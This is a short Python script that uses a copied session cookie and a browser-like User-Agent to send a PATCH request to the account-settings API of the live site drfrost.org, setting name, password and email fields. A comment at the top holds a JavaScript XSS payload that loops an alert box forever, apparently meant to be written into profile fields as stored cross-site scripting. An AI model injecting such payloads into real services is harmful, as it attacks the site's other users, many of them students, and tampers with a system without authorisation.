import requests

#<script>let i=1; while(i == 1){alert(1)};</script>

PHPSESSID = "PHPSESSID HERE"

firstname = "**NAME**"
surname = '**SURNAME**'
password = "*PASSWORD HERE*"
email = '**EMAILHERE**'

url = "https://www.drfrost.org/api/user/other"

headers = {
    "Cookie":f"hideCookieConsent=true; PHPSESSID={PHPSESSID};",
    "User-Agent":"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Referer":"https://www.drfrost.org/settings.php?tab=account"
}

payload = {
    "firstname":f"{firstname}",
    "surname":f"{surname}",
    "password":f"{password}",
    "email":f"{email}",
    "title":""
}


req = requests.patch(url=url,headers=headers,json=payload)


print(req.status_code,req.text)
